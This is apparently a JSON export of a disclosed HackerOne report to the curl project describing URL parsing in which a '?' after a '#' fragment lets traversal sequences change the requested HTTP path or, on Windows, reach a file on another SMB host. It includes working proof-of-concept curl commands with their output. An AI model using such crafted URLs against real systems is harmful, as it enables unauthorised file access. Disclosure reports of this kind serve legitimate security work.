{
  "id": 726117,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MjYxMTc=",
  "url": "https://hackerone.com/reports/726117",
  "title": "SMB access smuggling via FILE URL on Windows",
  "state": "Closed",
  "substate": "not-applicable",
  "severity_rating": "none",
  "readable_substate": "N/A",
  "created_at": "2019-10-31T06:08:59.735Z",
  "submitted_at": "2019-10-31T06:08:59.735Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "fms",
    "url": "/fms",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-01-17T23:12:26.127Z",
  "bug_reporter_agreed_on_going_public_at": "2021-01-17T23:12:26.046Z",
  "team_member_agreed_on_going_public_at": "2021-01-08T08:15:39.188Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\n\nWhile CURL 7.62 > parses URLs that have an ? (parameter separator) char after the # (fragment separator), CURL urlapi code treats the path with the hash part as it being the same one, this may allow some problem on specific protocols that may have a security impact.\nOn HTTP, an attacker may be able to modify original requests by appending \"?\" to the fragment part of the URL, see first example.\nOn FILE, CURL can be confused while requesting FILE urls to get a file from a different server that the user intended on Windows as the FILE protocol on Windows supports SMB. \n\n## Steps To Reproduce:\nHTTP Example:\n```\nfmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin\n$ ./curl -v \"http://localhost/safepath/something#/../../anotherpath/somethingelse\"\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n\n*   Trying ::1:80...\n* TCP_NODELAY set\n* Connected to localhost (::1) port 80 (#0)\n> GET /safepath/something HTTP/1.1\n> Host: localhost\n> User-Agent: curl/7.66.0\n> Accept: */*\n>\n\nfmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin\n$ ./curl -v \"http://localhost/safepath/something#/../../anotherpath/somethingelse?\"\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n\n*   Trying ::1:80...\n* TCP_NODELAY set\n* Connected to localhost (::1) port 80 (#0)\n> GET /anotherpath/somethingelse? HTTP/1.1\n> Host: localhost\n> User-Agent: curl/7.66.0\n> Accept: */*\n>\n```\n\nFile example:\n```\nfmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin\n$ ./curl \"file://localhost/windows/win.ini\"\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100    92  100    92    0     0  46000      0 --:--:-- --:--:-- --:--:-- 46000\n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n\n\nfmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin\n$ ./curl \"file://localhost/windows/win.ini#/../..//192.168.88.248/home/secret.txt\"\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100    92  100    92    0     0  46000      0 --:--:-- --:--:-- --:--:-- 46000\n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n\nfmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin\n$ ./curl \"file://localhost/windows/win.ini#/../..//192.168.88.248/home/secret.txt?\"\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100    33  100    33    0     0   2750      0 --:--:-- --:--:-- --:--:--  2750\nfile on different smb server/path\n```\n\n## Impact\n\nModify expected request behavior  on several protocols",
  "bounty_amount": "400.0",
  "formatted_bounty": "$400",
  "weakness": {
    "id": 107,
    "name": "Improper Input Validation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 9,
  "voters": [
    "taha",
    "bombon",
    "rook1337",
    "akashhamal0x01",
    "amad3u6",
    "h4x0r_dz",
    "demonia",
    "vishnuraj",
    "michael11_field"
  ],
  "severity": {
    "rating": "none",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
